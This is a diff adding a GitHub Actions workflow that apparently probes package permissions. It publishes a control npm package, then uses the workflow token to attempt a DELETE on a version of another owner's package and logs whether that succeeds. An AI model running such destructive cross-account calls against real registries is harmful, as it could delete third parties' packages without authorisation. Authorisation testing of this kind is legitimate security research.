@@ -1,0 +1,60 @@
+name: G06 Package Foreign Delete Probe
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+  packages: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Publish B self-control package
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          mkdir package
+          cd package
+          printf '%s\n' '{"name":"@apexblack-cobra-0d5101/g06-b-delete-control-v1","version":"1.0.0","description":"G06 controlled B package","main":"index.js"}' > package.json
+          printf '%s\n' 'module.exports = "B_PACKAGE_DELETE_CONTROL_CANARY_V1";' > index.js
+          printf '%s\n' '@apexblack-cobra-0d5101:registry=https://npm.pkg.github.com' > .npmrc
+          printf '%s\n' '//npm.pkg.github.com/:_authToken='${NODE_AUTH_TOKEN} >> .npmrc
+          npm publish --registry=https://npm.pkg.github.com
+      - name: Probe package version writers
+        uses: actions/github-script@v7
+        env:
+          TARGET_OWNER: apexblackrhino1782764375
+          TARGET_PACKAGE: g06-foreign-package-v2
+          TARGET_VERSION_ID: "1095810292"
+          CONTROL_PACKAGE: g06-b-delete-control-v1
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            async function request(method, route, params = {}) {
+              try {
+                const response = await github.request(method + " " + route, {
+                  ...params,
+                  headers: { accept: "application/vnd.github+json" }
+                });
+                return { status: response.status, data: response.data };
+              } catch (error) {
+                return { status: error.status || 0, data: error.response?.data || String(error.message) };
+              }
+            }
+            const foreignList = await request("GET", "/users/" + process.env.TARGET_OWNER + "/packages/npm/" + process.env.TARGET_PACKAGE + "/versions");
+            const foreignBefore = await request("GET", "/user/packages/npm/" + process.env.TARGET_PACKAGE + "/versions/" + process.env.TARGET_VERSION_ID);
+            const foreignDelete = await request("DELETE", "/user/packages/npm/" + process.env.TARGET_PACKAGE + "/versions/" + process.env.TARGET_VERSION_ID);
+            const foreignAfter = await request("GET", "/user/packages/npm/" + process.env.TARGET_PACKAGE + "/versions/" + process.env.TARGET_VERSION_ID);
+            const controlList = await request("GET", "/user/packages/npm/" + process.env.CONTROL_PACKAGE + "/versions");
+            const controlId = controlList.data?.[0]?.id;
+            const controlDelete = controlId
+              ? await request("DELETE", "/user/packages/npm/" + process.env.CONTROL_PACKAGE + "/versions/" + controlId)
+              : { status: "no-control-id", data: controlList };
+            console.log("G06_PACKAGE_DELETE_RESULT", JSON.stringify({
+              actor: context.actor,
+              currentRepo: context.repo,
+              foreign: { owner: process.env.TARGET_OWNER, package: process.env.TARGET_PACKAGE, versionId: process.env.TARGET_VERSION_ID, foreignList, foreignBefore, foreignDelete, foreignAfter },
+              selfControl: { package: process.env.CONTROL_PACKAGE, controlId, controlList, controlDelete }
+            }));
+
